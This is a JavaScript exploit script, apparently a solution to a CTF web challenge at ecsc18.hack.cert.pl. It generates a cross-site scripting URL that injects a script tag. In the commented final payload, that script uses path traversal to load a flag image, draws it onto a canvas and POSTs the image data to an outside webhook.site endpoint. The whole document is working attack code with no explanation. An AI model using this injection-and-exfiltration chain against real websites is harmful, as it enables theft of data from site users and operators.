var CODE = ()=>{
	d=document;
x=c=>d.createElement.call(d,c);

i=x('img');
i.src='https://web-art.ecsc18.hack.cert.pl/chart?chart=a';
c=x('canvas');

i.onload = function(){
	c.width=i.width;c.height=i.height;
	c.getContext("2d").drawImage(i, 0, 0);
	a=x('form');
	b=x('input');
	a.method='POST';
	a.action = 'https://webhook.site/ca40349e-56c5-4610-bbfc-4942ebf46842';
	b.name='f';
	b.value=c.toDataURL("image/png");
	a.appendChild(b);
	d.body.appendChild(a);
	a.submit();
};
}


function generateURL(){
	var sc = `<script src="chart?chart=${encodeURIComponent('('+CODE.toString().replace(/\s/g, '')+')()//')}"></script>`;
	return `https://web-art.ecsc18.hack.cert.pl/chart?chart=${encodeURIComponent(sc)}`;
}

console.log(generateURL());



/*
https://web-art.ecsc18.hack.cert.pl/chart?chart=%3Cscript%20src%3D%22chart%3Fchart%3D(()%253D%253E%257Bd%253Ddocument%253Bx%253Dc%253D%253Ed.createElement.call(d%252Cc)%253Bi%253Dx('img')%253Bi.src%253D'https%253A%252F%252Fweb-art.ecsc18.hack.cert.pl%252Fchart%253Fchart%253D..%252F..%252F..%252F..%252F..%252F..%252F..%252Fflag'%253Bc%253Dx('canvas')%253Bi.onload%253Dfunction()%257Bc.width%253Di.width%253Bc.height%253Di.height%253Bc.getContext(%25222d%2522).drawImage(i%252C0%252C0)%253Ba%253Dx('form')%253Bb%253Dx('input')%253Ba.method%253D'POST'%253Ba.action%253D'https%253A%252F%252Fwebhook.site%252Fca40349e-56c5-4610-bbfc-4942ebf46842'%253Bb.name%253D'f'%253Bb.value%253Dc.toDataURL(%2522image%252Fpng%2522)%253Ba.appendChild(b)%253Bd.body.appendChild(a)%253Ba.submit()%253B%257D%253B%257D)()%252F%252F%22%3E%3C%2Fscript%3E
*/